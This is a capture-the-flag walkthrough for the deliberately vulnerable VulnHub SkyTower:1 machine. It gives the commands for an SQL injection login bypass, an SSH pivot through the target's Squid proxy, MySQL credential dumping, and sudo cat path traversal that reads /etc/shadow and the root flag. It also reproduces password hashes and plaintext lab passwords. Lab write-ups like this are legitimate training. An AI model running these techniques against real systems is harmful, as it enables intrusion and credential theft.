# Machine Link
https://www.vulnhub.com/entry/skytower-1,96/

# IP
192.168.1.93

# Description
Welcome to SkyTower:1

This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the "flag".

You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.

We encourage you to try it our for yourself first, give yourself plenty of time and then only revert to the Walkthroughs below.

Enjoy!

Telspace Systems

@telspacesystems

# Nmap

Nmap Open Port Scan :

```bash
nmap -v -p- 192.168.1.93

PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
```

Nmap Script Scan :

```bash
nmap -v -p- -sC -sV -sT $IP

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
```

Lets use SQL injection authbypass payloads from :
[https://github.com/InfoSecWarrior/Offensive-Payloads](https://github.com/InfoSecWarrior/Offensive-Payloads)

There we many payloads through which we can login example :
`‘-’`

After login we found this information :
<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/7c5e2b65-b096-42cc-b1fb-491f85552be3" />

We found credentials for john user :

**john : hereisjohn**

Now we cannot directly access the ssh as the port is filtered. So lets try using the proxy the target is running via either proxychains or proxytunnel :
```bash
proxytunnel -p 192.168.1.93:3128 -d 127.0.0.1:22 -a 4444
```

Now make an ssh connection with :
```bash
#use /bin/bash to get the shell as command
ssh john@127.0.0.1 -p 4444 /bin/bash

rm .bashrc

ssh john@127.0.0.1 -p 4444
```
<img width="1547" height="832" alt="image" src="https://github.com/user-attachments/assets/080d059d-909c-4e5d-a0d3-40dea2c4d30f" />

Now to get the stable shell delete the .bashrc file and relogin with ssh :
<img width="1495" height="962" alt="image" src="https://github.com/user-attachments/assets/d59763b2-788a-45de-9015-d4f8050042c3" />

Now in the /var/www/login.php page we found the credentials of mysql login
<img width="1422" height="643" alt="image" src="https://github.com/user-attachments/assets/dabfcf48-b5ba-40a6-8fe9-6d41ca9881cd" />

Now login with mysql with credentials root:root

```bash
mysql -uroot -proot

show databases;
use SkyTech;
show tables;
select * from login;
```

<img width="962" height="443" alt="image" src="https://github.com/user-attachments/assets/2fd5825d-768a-4071-bc6e-233211ae998f" />

<img width="833" height="479" alt="image" src="https://github.com/user-attachments/assets/54707b09-1f13-4ffd-a4e5-b6d99dca02ad" />

We found the credentials of other two users :

sara : ihatethisjob
william : senseable

Login with sara using same /bin/bash ssh technique and delete the .bashrc file and login again :

```bash
#use /bin/bash to get the shell as command
ssh sara@127.0.0.1 -p 4444 /bin/bash

rm .bashrc

ssh john@127.0.0.1 -p 4444
```
<img width="975" height="423" alt="image" src="https://github.com/user-attachments/assets/468239eb-b32d-4e5d-bd6b-e6620d9ff9a9" />

Now lets see sudo permissions
<img width="1252" height="202" alt="image" src="https://github.com/user-attachments/assets/186ebb35-f13d-4f7b-b067-d454eeb9575e" />

Now lets exploit this cat permission by traversal strings :

```bash
sudo /bin/cat /accounts/../etc/shadow

sudo /bin/cat /accounts/../etc/passwd
```

<img width="1800" height="876" alt="image" src="https://github.com/user-attachments/assets/bffbdf10-6aaa-46d3-b2c7-10acf5264076" />

Now use make the passwd and shadow file on attacker system and use unshadow to merge them :

```bash
unshadow passwd shadow >> unshadow

root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
sshd:*:101:65534::/var/run/sshd:/usr/sbin/nologin
mysql:!:102:105:MySQL Server,,,:/nonexistent:/bin/false
john:$6$a39powbs$ditVKZ1waa6vJEh3BG1d5jLv/uADKcl.r1kcA.XKyhNfJoiDhSdwmSZel3V5cZ/S6ec3wd8rdNA2dOznTXhl0/:1000:1000:john,,,:/home/john:/bin/bash
sara:$6$2PvpHNG0$hbaMRd5fZhWMDHyyhGHINSy.qBHnvP4QW1k9RSwv.pQM6SoZey53C7S7aF6263ae6qx5TwVA6sahf5tebUqvY1:1001:1001:,,,:/home/sara:/bin/bash
william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn9.HyxjKhSVji8/CzHNFLit3GU1:1002:1002:,,,:/home/william:/bin/bash
```

We can crack the root’s password hash, we can use john and hashcat for this.

But lets exploit the sudo /bin/cat to directly see the flag.txt which might give us some password :

```bash
sudo /bin/cat /accounts/../root/flag.txt
```
<img width="1105" height="495" alt="image" src="https://github.com/user-attachments/assets/a50ed235-6551-4bbb-8fe1-9e3d5e9bcc4b" />

We found the password :
**root:theskytower**

Use this to switch to the root user
```bash
su - root
theskytower
```

---
